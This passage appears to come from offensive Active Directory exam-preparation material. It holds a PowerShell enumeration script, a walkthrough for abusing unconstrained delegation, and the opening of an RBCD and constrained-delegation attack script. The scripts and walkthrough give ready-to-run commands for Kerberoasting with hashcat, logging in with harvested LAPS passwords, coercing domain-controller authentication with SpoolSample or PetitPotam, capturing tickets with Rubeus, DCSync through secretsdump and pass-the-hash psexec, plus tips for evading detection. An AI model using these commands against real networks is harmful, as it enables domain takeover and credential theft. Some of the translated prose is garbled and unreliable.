    [string]$AclTarget = '',           # ACL Mode: target object DN，Leave blank=domain root
    [int]$MaxResults = 0,              # 0=No limit，>0 Truncate output (use large areas first) 50 Test the waters）
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# Basics: Search Root/Domain SID/Universal Searcher
# ---------------------------------------------------------------------------
$script:RootPath = ''
$script:DomainSID = ''
$script:DomainFqdn = ''

function Initialize-M12Root {
    if ($SearchRoot) {
        $script:RootPath = "LDAP://$SearchRoot"
    } elseif ($Domain) {
        # corp.local -> DC=corp,DC=local
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        $script:RootPath = "LDAP://$dn"
        $script:DomainFqdn = $Domain
    } else {
        $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
        $nc = $rootDse.Properties['defaultNamingContext']
        if (-not $nc -or $nc.Count -eq 0) {
            throw "Unable to obtain defaultNamingContext: The machine is not domain added or LDAP is unreachable. Please give -Domain DOMAIN explicitly"
        }
        $script:RootPath = "LDAP://$($nc[0])"
        $script:DomainFqdn = (($nc[0] -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(3) }) -join '.'
    }
    # Domain SID
    $domEntry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $sidBytes = $domEntry.Properties['objectSid'].Value
    if ($sidBytes) {
        $script:DomainSID = (New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)).Value
    }
    if (-not $script:DomainFqdn) {
        $script:DomainFqdn = (($script:RootPath -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(4) }) -join '.'
    }
}

function New-M12Searcher {
    param(
        [Parameter(Mandatory = $true)][string]$Filter,
        [string[]]$Properties = @('sAMAccountName'),
        [int]$PageSize = 200
    )
    $entry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = $entry
    $s.Filter = $Filter
    $s.PageSize = $PageSize
    $s.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    foreach ($p in $Properties) { [void]$s.PropertiesToLoad.Add($p) }
    return $s
}

# Get an attribute in the search results (return $null if it does not exist, get the first one if there are multiple values)
function Get-M12Prop {
    param($Result, [string]$Name)
    if ($Result.Properties.Contains($Name) -and $Result.Properties[$Name].Count -gt 0) {
        return $Result.Properties[$Name][0]
    }
    return $null
}

function Convert-M12FileTime {
    param($Raw)
    if (-not $Raw) { return '' }
    try {
        $ft = [Convert]::ToInt64($Raw)
        if ($ft -le 0) { return '' }
        return [DateTime]::FromFileTime($ft).ToString('yyyy-MM-dd HH:mm:ss')
    } catch { return [string]$Raw }
}

# userAccountControl key bits (just remember these few for the exam)
function Convert-M12Uac {
    param($Raw)
    if (-not $Raw) { return '' }
    $v = 0
    try { $v = [Convert]::ToInt32($Raw) } catch { return [string]$Raw }
    $flags = @()
    if ($v -band 0x000002)  { $flags += 'DISABLED' }
    if ($v -band 0x000020)  { $flags += 'PasswdNotReqd' }
    if ($v -band 0x002000)  { $flags += 'PASSWD_NOT_EXPIRED' }
    if ($v -band 0x020000)  { $flags += 'DONT_REQ_PREAUTH(ASREP)' }
    if ($v -band 0x040000)  { $flags += 'TrustedForDelegation(unconstrained)' }
    if ($v -band 0x080000)  { $flags += 'NOT_DELEGATED (sensitive cannot be delegated)' }
    if ($v -band 0x100000)  { $flags += 'USE_DES_ONLY' }
    if ($v -band 0x200000)  { $flags += 'TrustedToAuthForDelegation(protocol conversion)' }
    return ($flags -join ',')
}

function Write-M12Head {
    param([string]$Text)
    Write-Output ""
    Write-Output "===== $Text ====="
}

function Limit-M12Rows {
    param($Rows)
    if ($MaxResults -gt 0) { return @($Rows | Select-Object -First $MaxResults) }
    return @($Rows)
}

# ---------------------------------------------------------------------------
# Domain: domain information + MAQ (scenario 51 to confirm MachineAccountQuota > 0)
# ---------------------------------------------------------------------------
function Get-M12DomainInfo {
    Write-M12Head "Domain information (Domain)"
    Write-Output "Search root: $script:RootPath"
    Write-Output "Domain FQDN: $script:DomainFqdn"
    Write-Output "Domain SID: $script:DomainSID"
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output "Current identity: $($me.Name) (Authentication type $($me.AuthenticationType))"

    $s = New-M12Searcher -Filter '(objectClass=domainDNS)' `
        -Properties @('distinguishedName','ms-DS-MachineAccountQuota','msDS-Behavior-Version')
    $r = $s.FindOne()
    if ($r) {
        $maq = Get-M12Prop $r 'ms-DS-MachineAccountQuota'
        if ($maq) {
            Write-Output "MachineAccountQuota : $maq (scenario 51 RBCD requires > 0, default 10)"
        } else {
            Write-Output "MachineAccountQuota: not read (old domain or insufficient permissions, estimated at 10, please confirm again when RBCD fails to add the machine)"
        }
        $func = Get-M12Prop $r 'msDS-Behavior-Version'
        if ($func) { Write-Output "Domain functional level msDS-Behavior-Version: $func" }
    }

    # DC list
    Write-Output ""
    Write-Output "--- Domain Controller (fall back to Computers container approximation when configuration partition is unreliable) ---"
    $s2 = New-M12Searcher -Filter '(&(objectCategory=computer)(primaryGroupID=516))' `
        -Properties @('dnsHostName','operatingSystem')
    foreach ($c in $s2.FindAll()) {
        Write-Output ("DC  : " + (Get-M12Prop $c 'dnsHostName'))
    }
}

# ---------------------------------------------------------------------------
# Users
# ---------------------------------------------------------------------------
function Get-M12Users {
    Write-M12Head "Domain users (Users) - follow description plain text password / adminCount=1 / no pre-authentication"
    $s = New-M12Searcher -Filter '(&(objectCategory=person)(objectClass=user))' `
        -Properties @('sAMAccountName','userPrincipalName','description','adminCount','pwdLastSet','lastLogon','userAccountControl','servicePrincipalName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            SamAccountName = (Get-M12Prop $r 'sAMAccountName')
            UPN            = (Get-M12Prop $r 'userPrincipalName')
            AdminCount     = (Get-M12Prop $r 'adminCount')
            UAC            = (Convert-M12Uac (Get-M12Prop $r 'userAccountControl'))
            LastLogon      = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
            Description    = (Get-M12Prop $r 'description')
        }
    }
    Limit-M12Rows $rows | Sort-Object SamAccountName |
        Format-Table -AutoSize SamAccountName, UPN, AdminCount, UAC, LastLogon, Description |
        Out-String -Width 220 | Write-Output
    Write-Output "AS-REP Roasting candidates (UAC with DONT_REQ_PREAUTH):"
    $s3 = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' `
        -Properties @('sAMAccountName')
    foreach ($r in $s3.FindAll()) { Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName')) }
}

# ---------------------------------------------------------------------------
# Groups: All groups + privileged group members (according to well-known RID, language-independent writing)
# ---------------------------------------------------------------------------
function Get-M12Groups {
    Write-M12Head "Privileged group members (Groups) - Use SID RID to locate, not affected by Chinese and English group names"
    if (-not $script:DomainSID) {
        Write-Output "[!] Unable to get domain SID, skip privilege group resolution (try using -Domain DOMAIN to specify it explicitly)"
        return
    }
    $rids = @{
        '512' = 'Domain Admins'
        '519' = 'Enterprise Admins'
        '518' = 'Schema Admins'
        '544' = 'Builtin Administrators'
    }
    foreach ($rid in ($rids.Keys | Sort-Object)) {
        $sid = "$script:DomainSID-$rid"
        $s = New-M12Searcher -Filter "(objectSid=$sid)" -Properties @('sAMAccountName','member','description')
        $r = $s.FindOne()
        if (-not $r) { continue }
        Write-Output ("--- {0} ({1}) ---" -f $rids[$rid], (Get-M12Prop $r 'sAMAccountName'))
        $members = $r.Properties['member']
        if ($members) { foreach ($m in $members) { Write-Output ("  " + $m) } }
        else { Write-Output "(no members)" }
    }

    Write-M12Head "All groups (name + number of members)"
    $s2 = New-M12Searcher -Filter '(objectClass=group)' -Properties @('sAMAccountName','member','adminCount')
    $rows = @()
    foreach ($r in $s2.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Group      = (Get-M12Prop $r 'sAMAccountName')
            AdminCount = (Get-M12Prop $r 'adminCount')
            Members    = ($r.Properties['member']).Count
        }
    }
    Limit-M12Rows $rows | Sort-Object Group | Format-Table -AutoSize Group, AdminCount, Members |
        Out-String -Width 160 | Write-Output
}

# ---------------------------------------------------------------------------
# Computers
# ---------------------------------------------------------------------------
function Get-M12Computers {
    Write-M12Head "Domain computers (Computers) - pay attention to OS (old system = local privilege escalation) and login time"
    $s = New-M12Searcher -Filter '(objectClass=computer)' `
        -Properties @('sAMAccountName','dnsHostName','operatingSystem','operatingSystemVersion','lastLogon','distinguishedName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Name      = (Get-M12Prop $r 'sAMAccountName')
            DnsHost   = (Get-M12Prop $r 'dnsHostName')
            OS        = (Get-M12Prop $r 'operatingSystem')
            OSVer     = (Get-M12Prop $r 'operatingSystemVersion')
            LastLogon = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
        }
    }
    Limit-M12Rows $rows | Sort-Object Name | Format-Table -AutoSize Name, DnsHost, OS, OSVer, LastLogon |
        Out-String -Width 200 | Write-Output
}

# ---------------------------------------------------------------------------
# SPN: Kerberoast candidate
# ---------------------------------------------------------------------------
function Get-M12Spn {
    Write-M12Head "SPN account (Kerberoast candidate, the service account for scenario 52 is also here)"
    $s = New-M12Searcher -Filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' `
        -Properties @('sAMAccountName','servicePrincipalName','adminCount','pwdLastSet','userAccountControl','memberOf')
    foreach ($r in $s.FindAll()) {
        $spns = @($r.Properties['servicePrincipalName']) -join ' | '
        Write-Output ("Account:" + (Get-M12Prop $r 'sAMAccountName'))
        Write-Output ("  SPN    : " + $spns)
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        if ($uac) { Write-Output ("  UAC    : " + $uac) }
        $mo = $r.Properties['memberOf']
        if ($mo) { Write-Output ("Group members:" + (@($mo) -join ' | ')) }
    }
    Write-Output ""
    Write-Output "Follow-up (attack machine): impacket-GetUserSPNs -dc-ip TARGET DOMAIN/USER:PASS -outputfile spn.txt"
    Write-Output "               hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"
}

# ---------------------------------------------------------------------------
# Delegation: three categories: non-constrained / constrained / RBCD
# ---------------------------------------------------------------------------
function Get-M12Delegation {
    Write-M12Head "Unconstrained delegation (UAC 0x80000=524288) - landing point for scenario 50"
    $s = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
    }
    if (-not $found) { Write-Output "(none)" }

    Write-M12Head "Constrained Delegation (msDS-AllowedToDelegateTo) – Service Account for Scenario 52"
    $s2 = New-M12Searcher -Filter '(msDS-AllowedToDelegateTo=*)' `
        -Properties @('sAMAccountName','msDS-AllowedToDelegateTo','userAccountControl')
    $found = $false
    foreach ($r in $s2.FindAll()) {
        $found = $true
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        Write-Output ("Account:" + (Get-M12Prop $r 'sAMAccountName') + ("  [{0}]" -f $uac))
        foreach ($t in $r.Properties['msDS-AllowedToDelegateTo']) { Write-Output ("Can be delegated to:" + $t) }
    }
    if (-not $found) { Write-Output "(none)" }

    Write-M12Head "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity already has a value) - target machine for scenario 51"
    $s3 = New-M12Searcher -Filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s3.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
        Write-Output ("      DN : " + (Get-M12Prop $r 'distinguishedName'))
    }
    if (-not $found) { Write-Output "(None, indicating that no one has touched this attribute, which is exactly the state we can write)" }
    Write-Output ""
    Write-Output "Next step: RBCD configuration m12-delegation-attacks.ps1 -Mode RBCD"
}

# ---------------------------------------------------------------------------
# ACL: read-only summary + high-risk permissions highlighting
# ---------------------------------------------------------------------------
function Get-M12AclSummary {
    $target = $AclTarget
    if (-not $target) { $target = $script:RootPath -replace '^LDAP://', '' }
    Write-M12Head "ACL summary (read only): $target"
    $interesting = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','ExtendedRight','CreateChild','Delete','WriteProperty','Self')
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$target")
    try {
        $rules = $de.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    } catch {
        Write-Output "[!] Failed to read ACL: $($_.Exception.Message) (no READ_CONTROL permission on the target object or wrong DN)"
        Write-Output "Confirm the DN using the distinguishedName output by -Mode Computers, not the container name."
        return
    }
    $rows = @()
    foreach ($rule in $rules) {
        $rights = [string]$rule.ActiveDirectoryRights
        $hit = ''
        foreach ($i in $interesting) {
            if (($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]$i) -ne 0) {
                $hit = 'YES'
                break
            }
        }
        if (-not $hit) { continue }
        $who = $rule.IdentityReference.Value
        try { $who = $rule.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        $rows += New-Object PSObject -Property @{
            Principal = $who
            Rights    = $rights
            Type      = [string]$rule.AccessControlType
            ObjectType= [string]$rule.ObjectType
            Inherited = $rule.IsInherited
        }
    }
    if ($rows.Count -eq 0) {
        Write-Output "High-risk entries such as GenericAll/GenericWrite/WriteDacl/WriteOwner were not found (or the current identity cannot read the ACL)."
    } else {
        $rows | Sort-Object Principal | Format-Table -AutoSize Principal, Rights, Type, ObjectType, Inherited |
            Out-String -Width 220 | Write-Output
    }
    Write-Output "Note: ObjectType is the GUID of the attribute/extended permission; when judging the LAPS readable permission, see whether it is equal to"
    Write-Output "Schema GUID of ms-Mcs-AdmPwd (the measured results using -Mode LAPS are faster)."
}

# ---------------------------------------------------------------------------
# LAPS: legacy(ms-Mcs-AdmPwd*) + Windows LAPS(msLAPS-*) + readability judgment
# ---------------------------------------------------------------------------
function Get-M12Laps {
    Write-M12Head "LAPS enumeration (scenario 49)"

    $name = $ComputerName
    if ($name -and -not $name.EndsWith('$')) { $name = "$name`$" }
    if ($name) {
        $filter = "(&(objectClass=computer)(sAMAccountName=$name))"
    } else {
        # First detect "which machines have LAPS installed": the expiration time attribute is readable by default domain users and is an existence criterion.
        $filter = '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))'
    }
    $props = @('sAMAccountName','dnsHostName','distinguishedName',
               'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime',
               'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword')
    $s = New-M12Searcher -Filter $filter -Properties $props

    $legacyHits = 0
    $winlapsHits = 0
    $encHits = 0
    $lastDns = 'TARGET'
    foreach ($r in $s.FindAll()) {
        $host1 = Get-M12Prop $r 'sAMAccountName'
        $dns   = Get-M12Prop $r 'dnsHostName'
        if ($dns) { $lastDns = $dns }
        $pwd   = Get-M12Prop $r 'ms-Mcs-AdmPwd'
        $exp   = Convert-M12FileTime (Get-M12Prop $r 'ms-Mcs-AdmPwdExpirationTime')
        $wpwd  = Get-M12Prop $r 'msLAPS-Password'
        $wexp  = Get-M12Prop $r 'msLAPS-PasswordExpirationTime'
        $wenc  = Get-M12Prop $r 'msLAPS-EncryptedPassword'

        Write-Output ("Machine: {0} ({1})" -f $host1, $dns)
        if ($pwd) {
            $legacyHits++
            Write-Output ("[legacy LAPS] ms-Mcs-AdmPwd = {0} (expiration time {1})" -f $pwd, $exp)
            Write-Output ("Execute: impacket-wmiexec DOMAIN/Administrator@{0} -p '{1}'" -f $dns, $pwd)
        }
        if ($wpwd) {
            $winlapsHits++
            Write-Output ("[Windows LAPS plain text mode] msLAPS-Password = {0}" -f $wpwd)
        }
        if ($wenc) {
            $encHits++
            Write-Output ("[Windows LAPS Encryption Mode] msLAPS-EncryptedPassword exists ({0} bytes), plain LDAP cannot decipher the clear text" -f @($wenc).Count)
        }
        if (-not $pwd -and -not $wpwd -and -not $wenc) {
            Write-Output ("Only expiration time ({0}) has no password value -> LAPS has been deployed, but **current identity has no read permission**" -f $exp)
        }
    }

    Write-Output ""
    Write-Output "--- Readability judgment conclusion ---"
    if (($legacyHits + $winlapsHits) -gt 0) {
        Write-Output "The current identity can read the plain text password -> Scenario 49 is established, directly use the wmiexec command above to implement it."
        Write-Output "When only opening WinRM, change: evil-winrm -i $lastDns -u Administrator -p '<read password>'"
    } elseif ($encHits -gt 0) {
        Write-Output "Only see msLAPS-EncryptedPassword (DPAPI encryption): pure LDAP cannot get the clear text."
        Write-Output "Alternatives: ① Find a machine that still uses legacy LAPS; ② Find a machine that has msLAPS-Password plain text mode turned on;"
        Write-Output "③ Use the Windows LAPS module to read in the controlled domain administrator/local administrator session:"
        Write-Output "Get-LapsADPassword -Identity TARGET -AsPlainText (Windows LAPS, RSAT/PowerShell 7 environment)"
        Write-Output "Legacy LAPS client PowerShell module installed by msiexec: Import-Module AdmPwd.PS"
        Write-Output "         Get-AdmPwdPassword -ComputerName TARGET"
    } else {
        Write-Output "No password attributes were read: ① LAPS is not deployed in the domain; ② The current user does not have read permission for ms-Mcs-AdmPwd."
        Write-Output "Change the angle: Find the subject in this domain that has ReadProperty for the LAPS attribute (see PowerView writing method)"
        Write-Output "m12-laps-and-trust-notes.md), or use the RBCD/Delegation/Certificate entrance to get a higher identity first."
    }

    Write-Output ""
    Write-Output "--- Whether the LAPS client is installed locally (used to determine the version) ---"
    foreach ($p in @('C:\Program Files\LAPS\CSE\Admpwd.dll', 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll')) {
        if (Test-Path $p) { Write-Output ("Legacy LAPS CSE exists:" + $p) }
    }
    Write-Output "Windows LAPS: Built-in in Windows 11/2022+, check the registry HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS"
    Write-Output "Or use Get-LapsADPassword to determine whether it is available."
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12Help {
    Write-Output @"

m12-ad-enum-windows.ps1 —— pure ADSI Domain enum (none) RSAT / none PowerView）

  .\m12-ad-enum-windows.ps1 -Mode All
      run all：Domain / Users / Groups / Computers / SPN / Delegation / ACL / LAPS
  .\m12-ad-enum-windows.ps1 -Mode Domain     [-Domain corp.local]
      domain SID / MAQ（RBCD Add machine prerequisite）/ current status / DC list
  .\m12-ad-enum-windows.ps1 -Mode Users      [-MaxResults 50]
      user + AS-REP Roasting candidate
  .\m12-ad-enum-windows.ps1 -Mode Groups
      privileged group member（DA/EA/Schema/Builtin Admins）+ Full set list
  .\m12-ad-enum-windows.ps1 -Mode Computers
      computer + OS + last login
  .\m12-ad-enum-windows.ps1 -Mode SPN
      Kerberoast candidate + Service Account (scenario 52）
  .\m12-ad-enum-windows.ps1 -Mode Delegation
      Unconstrained / constraint / RBCD Category three (scenario 50/51/52）
  .\m12-ad-enum-windows.ps1 -Mode ACL [-AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"]
      read only ACL summary, highlight GenericAll/GenericWrite/WriteDacl/WriteOwner
  .\m12-ad-enum-windows.ps1 -Mode LAPS [-ComputerName WS02]
      LAPS Two versions of reading + Readability judgment (scenario 49）

placeholder：DOMAIN=corp.local  TARGET=WS02  USER/PASS Appears only in subsequent print commands。
This script only performs read operations and does not change any directory objects; see the write delegation attribute. m12-delegation-attacks.ps1。
"@
}

# ---------------------------------------------------------------------------
# Main process
# ---------------------------------------------------------------------------
if ($Help) { Show-M12Help; return }

try {
    Initialize-M12Root
} catch {
    Write-Output "[!] Initialization failed: $($_.Exception.Message)"
    Write-Output "Solution: Explicitly give -Domain DOMAIN (such as -Domain corp.local), or confirm that the machine is within the domain and the DC is reachable."
    exit 1
}

switch ($Mode) {
    'All'       { Get-M12DomainInfo; Get-M12Users; Get-M12Groups; Get-M12Computers
                  Get-M12Spn; Get-M12Delegation; Get-M12AclSummary; Get-M12Laps }
    'Domain'    { Get-M12DomainInfo }
    'Users'     { Get-M12Users }
    'Groups'    { Get-M12Groups }
    'Computers' { Get-M12Computers }
    'SPN'       { Get-M12Spn }
    'Delegation'{ Get-M12Delegation }
    'ACL'       { Get-M12AclSummary }
    'LAPS'      { Get-M12Laps }
    'Help'      { Show-M12Help }
}

Write-Output ""
Write-Output "[*] Done -Mode $Mode. Delegation/RBCD implementation: m12-delegation-attacks.ps1;"
Write-Output "[*] Same enumeration on Linux side: m12-ad-enum-linux.sh; Trust and Extra SID: m12-laps-and-trust-notes.md"
````

## Scenario 50: Control of an unconstrained delegation machine, but no domain-level identity yet

**Situation**: Already controls a machine configured with **Unconstrained Delegation (Trusted for Delegation)** (can run Rubeus/trigger authentication); there is no domain management identity yet. The next step depends on being able to get a high-value identity (DC machine account or domain administrator) to authenticate to the machine and intercept its TGT.

**Assumptions**: The SPN port (445/5985 or 88 return connection) of the target DC/domain management can reach the unconstrained host; run the ticket capture tool as SYSTEM on the unconstrained host. Once the TGT of the DC machine account is obtained = DCSync is available (DC has replication permissions); the TGT of the domain manager = direct impersonation.

**Prepare (attacker)**：非约束主机上准备 `Rubeus.exe` + 认证触发器（`SpoolSample.exe` / `printerbug` / `PetitPotam`）；攻击机准备 `impacket-ticketConverter` 与 `secretsdump`。诱导认证触发方式见 `m12-delegation-attacks.ps1 -Mode Unconstrained`。

**Procedure**：
```powershell
# ① 非约束主机（SYSTEM）后台开抓票
Rubeus.exe monitor /interval:5 /nowrap
# ② 另开窗口诱导 DC 认证到本机（本机即被控非约束主机）
SpoolSample.exe DC01 $env:COMPUTERNAME        # or printerbug DC01 $env:COMPUTERNAME
# ③ monitor 输出出现 DC01$ 的 base64 TGT → 存成 dc.txt
```
```bash
# ④ Attack aircraft conversion and utilization
impacket-ticketConverter dc.txt dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass DC01.corp.local        # DC machine account → DCSync krbtgt/Domain management hash
impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # After getting the hash
```
**Scripts used**: `m12-delegation-attacks.ps1` (Rubeus monitor + trigger + base64 export template; Linux side conversion command is also in the comments).

**Validation**: `secretsdump` can dump the `krbtgt`/administrator hash, which proves that it is the DC machine TGT; first check whether the subject is `DC01$`.

**Failure branches and alternatives**：
- SpoolSample No echo/Error reported (patched or RPC blocked）→ Change induction vector：`PetitPotam`(EFSRPC)、`DFSCoerce`、MS-RPRN Variants `dementor`；Still not working → Passive etc.：Rubeus monitor Hanging, waiting for the real domain administrator to log in to the machine or access local services。
- What was caught was an ordinary user TGT（no DC/Domain management）→ Use it first horizontally (the machine that the user can access), or continue to wait for higher value authentication; also available `Rubeus harvest` Ideas to expand coverage。
- Unconstrained hosts vs. DC Not in reachable network segment → When authentication cannot be induced, the value of the host is only"Passive collection"，Go back to enumeration and find other entrances (don’t waste time on impossible back connections)）。

**Exam / OPSEC notes**: Running `Rubeus monitor` on an unconstrained host will continue to capture all certifications, and the log is obvious - it will stop when the task is completed (get the DC ticket); the captured tickets will be exported to the attack machine as soon as possible and then the local base64 text will be cleaned. Don’t use domain management TGT to jump directly to `psexec`. Confirm the value of `secretsdump` first and then decide the minimum action.

---

#### `m12-delegation-attacks.ps1` {#m12-delegation-attacks-ps1}

````powershell
<#
Purpose: Delegate a three-piece set Windows Side landing script——
      RBCD：Query / Configure (put the fake machine account SID written to the target machine
            msDS-AllowedToActOnBehalfOfOtherIdentity）/ rollback, pure ADSI + .NET accomplish；
      Constrained delegation: enumerating service accounts msDS-AllowedToDelegateTo，and given S4U2Self+S4U2Proxy
            Two sub-situations (with/no protocol conversion) Rubeus s4u and impacket-getST command template；
      Unconstrained Delegation: Four Pre-Checks Before Utilization + Rubeus monitor / Induction authentication command template。
scene：M12 scene 50（Unrestrained grasp DC TGT）、51（RBCD Impersonating an administrator）、52（Constraints are delegated to the specified SPN）。
rely：ADSI / System.DirectoryServices / System.Security.AccessControl（The system comes with，
      unnecessary RSAT of ActiveDirectory module）；
      Rubeus.exe（s4u / monitor / ptt，You need to deliver it to this machine by yourself, use -ToolDir Refers to directory）；
      SpoolSample.exe or printerbug（Inducement authentication trigger for unconstrained scenarios, optional）；
      By default, only commands are printed, add -Execute to actually call the external exe（Avoid false triggers）。
use：# 51 RBCD：Write and print subsequent commands on the attacking machine side
      .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
      # 51 RBCD: Task must be rolled back after completion
      .\m12-delegation-attacks.ps1 -Mode RBCD-Rollback -TargetComputer WS02
      # 52 Constrained delegation: See where svc_sql can be delegated, and print the commands for the two situations
      .\m12-delegation-attacks.ps1 -Mode Constrained -ServiceAccount svc_sql -Spn 'cifs/WS02.corp.local'
      # 50 Unrestricted: Pre-use physical examination + ticket capture/trigger order
      .\m12-delegation-attacks.ps1 -Mode Unconstrained -ToolDir C:\Tools -Execute
      # Only enumerate three types of delegation status
      .\m12-delegation-attacks.ps1 -Mode Enum
placeholder：DOMAIN=domain FQDN（corp.local） TARGET=target host（WS02）
      USER/PASS=Known credentials（Rubeus s4u Requires clear text for service account or rc4/aes）
      ——Do not write the real domain name in the script/Password, all passed in as parameters or printed as placeholders for replacement。
Test status: Not available Windows Domain environment actual measurement; native brackets/Quote pairing check passed。RBCD 写入用的是公开
      通用的 RawSecurityDescriptor 二进制写法（等价 PowerView Set-DomainObject），
      需要当前身份对目标计算机对象有 GenericWrite/GenericAll 或写该属性的权限。
and docs/12-ad-attacks.md Description of the difference：
  1) 文档 51 The scene is only given impacket Side process, write " AllowedToAct"Leave it to this script - this script
     RBCD model**write-only properties**，Do not generate a machine account (add a machine for use as an attack machine) impacket-addcomputer，
     -FakeAccount Refers to the account you have created; it is also applicable if you use a controlled service account as a fake subject）。
  2) The documentation says"Use .NET ADSI to write security descriptors without relying on the ActiveDirectory module"——achieve consistency，
     But note that if the attribute already has a value before writing, it will be Clear Write again, leaving no residue ACE。
  3) Constraint the delegated ticket request itself（S4U2Self/S4U2Proxy）Cannot use pure .NET Complete, the script uses
     WindowsIdentity Do a self-check on identity and delegation prerequisites, and provide actual ticket requests Rubeus / impacket
     Two sets of copyable commands (similar to the document, only templates are given)）。
#>
[CmdletBinding()]
param(
    [ValidateSet('Enum','RBCD','RBCD-Rollback','Constrained','Unconstrained','Help')]
    [string]$Mode = 'Enum',
    [string]$TargetComputer = '',      # TARGET：RBCD target machine / Native for unconstrained scenes
    [string]$FakeAccount = '',         # fake machine account sAMAccountName，like FAKE01$
    [string]$ServiceAccount = '',      # Service accounts that constrain delegation, such as svc_sql
    [string]$ImpersonateUser = 'Administrator',  # The target user to impersonate
    [string]$Spn = '',                 # target service SPN，like cifs/WS02.corp.local
    [string]$Domain = '',              # DOMAIN：domain FQDN，Leave blank=current domain
    [string]$ToolDir = '.',            # Rubeus.exe / SpoolSample.exe directory
    [switch]$Execute,                  # really call Rubeus / Trigger (default only prints）
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# Hang commonly used parameters into the script scope for each function to read (the function does not rely on the local scope of the caller)
$script:ToolDir = $ToolDir
$script:ImpersonateUser = $ImpersonateUser

# ---------------------------------------------------------------------------
# Public: Search root/sid/computer objects
# ---------------------------------------------------------------------------
function Initialize-M12dRoot {
    if ($Domain) {
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        return "LDAP://$dn"
    }
    $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
    $nc = $rootDse.Properties['defaultNamingContext']
    if (-not $nc -or $nc.Count -eq 0) {
        throw "Unable to obtain defaultNamingContext: No domain added or LDAP is unreachable, please use -Domain DOMAIN to specify it explicitly"
    }
    return "LDAP://$($nc[0])"
}

function Get-M12dSid {
    param([Parameter(Mandatory = $true)][string]$SamAccountName)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$SamAccountName)"
    $s.PageSize = 10
    [void]$s.PropertiesToLoad.Add('objectSid')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    if (-not $r) { throw "The account $SamAccountName cannot be found in the domain (the machine account must have a trailing $)" }
    $sid = New-Object System.Security.Principal.SecurityIdentifier($r.Properties['objectSid'][0], 0)
    return @($sid.Value, [string]$r.Properties['distinguishedName'][0])
}

function Get-M12dComputerDn {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $name = $ComputerName
    if (-not $name.EndsWith('$')) { $name = "$name`$" }
    $info = Get-M12dSid $name
    return $info[1]
}

function Write-M12dHead { param([string]$T) Write-Output ""; Write-Output "===== $T =====" }

# Current identity self-check (WindowsIdentity / Impersonation level, determines whether tickets can be captured in the future)
function Show-M12dIdentity {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output ("Current status:" + $id.Name)
    Write-Output ("  SID             : " + $id.User.Value)
    Write-Output ("Certification type:" + $id.AuthenticationType)
    Write-Output ("Simulation level:" + $id.ImpersonationLevel)
    if ($id.User.Value -eq 'S-1-5-18') {
        Write-Output "-> SYSTEM: You can run Rubeus monitor (you need to capture the TGT in LSASS)"
    } else {
